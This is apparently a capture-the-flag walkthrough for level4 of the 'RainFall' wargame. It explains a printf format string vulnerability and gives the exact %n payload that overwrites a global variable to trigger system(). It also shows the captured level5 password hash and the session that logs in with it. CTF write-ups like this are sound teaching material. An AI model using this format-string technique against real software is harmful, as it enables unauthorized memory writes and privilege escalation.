
### 1.
- **`n()` function** calls `fgets()` to read input, which is safe from buffer overflows.
- **`p()` function** is where the format string vulnerability exists. It calls `printf()`, and this is where the vulnerability can be exploited.
- The program has a global variable `m` at the address `0x8049810`. The value of `m` is compared to `0x1025544`. If they match, a shell is spawned via `system()`.

``` bash
(gdb) info variables m
All variables matching regular expression "m":

Non-debugging symbols:
0x08049808  completed.6159
0x08049810  m
```

### 2. **Objective**
The goal is to manipulate the `printf()` function to change the value of the global variable `m` at `0x8049810` so that the comparison in the code succeeds (`m == 0x1025544`), which will trigger the `system()` call and allow us to execute arbitrary code (i.e., read the password file).

### 3. **Understanding Format String Vulnerability**
- `printf()` is vulnerable to format string exploits. By controlling the format string, you can print memory values and modify values in memory using format specifiers like `%n`.
- `%x` prints the value at the memory address in hexadecimal.
- `%d` allows specifying a width for the printed value, and `%n` writes the number of characters printed so far into a variable (this is what we use to change `m`).

### 4. **Exploitation Process**
Here’s how you can manipulate the format string to change `m`:

1. **Leaking Memory with `%x`**:
   - First, we print memory values using the format string `"%x"`, which reveals the stack values. The goal is to find the address of the global variable `m` and modify it.
   - use Python to craft the exploit:
     ```bash
     python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit4
     cat /tmp/exploit4 | ./level4
     ```
     This will print memory addresses, and you look for the value of `m` by scanning the output.

2. **Adjusting the Format String**:
   - Once we find the address of `m`, we need to overwrite it with the value `0x1025544`. To do this, you need to control the output of `printf()` to write that value to the address of `m`.
   - Since the comparison checks if `m == 0x1025544`, we need to format the string in a way that makes `printf()` write the correct value.
   - First, we calculate the difference between `0x1025544` and the current value of `m` in the memory dump.
   - The format string you use is like this:
     ```python
     python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit4

     ```

3. **The Exploit Breakdown**:
   - `"\x10\x98\x04\x08"` is the address of the global variable `m` (in little-endian format).
   - `%16930112d` causes `printf()` to print a large number of characters to reach the required value for `m` (16930112 minus 4 bytes for `m`).
   - `%12$n` writes the number of characters printed so far (the value we calculated) into the address of `m` (at position 12 in the stack, corresponding to the address we passed earlier).

4. **Triggering the Shell**:
   - When the format string successfully writes the value `0x1025544` to `m`, the comparison `m == 0x1025544` is true, and the program calls `system()`.
   - This will execute the command `system("/bin/cat /home/user/level5/.pass")`, which reads the password for level 5.

5. **Final Steps**:
   - After successfully exploiting the format string vulnerability, you switch to the `level5` user by running `su level5`, and use the password obtained from the file `/home/user/level5/.pass` to log in.

``` bash 
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4
                                                                                     -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
level4@RainFall:~$ su level5
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
level5@RainFall:~$

``` 